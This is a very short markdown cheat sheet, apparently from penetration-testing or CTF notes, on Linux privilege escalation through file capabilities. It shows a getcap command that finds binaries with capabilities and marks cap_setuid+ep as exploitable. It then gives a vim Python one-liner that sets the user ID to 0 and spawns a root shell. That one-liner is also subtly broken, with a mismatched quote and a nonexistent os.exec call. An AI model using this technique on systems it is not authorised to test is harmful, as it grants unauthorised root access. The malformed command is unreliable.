# Example

### getcap -r / 2>/dev/null

## True Positive: cap_setuid+ep

## Example:

### ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")'


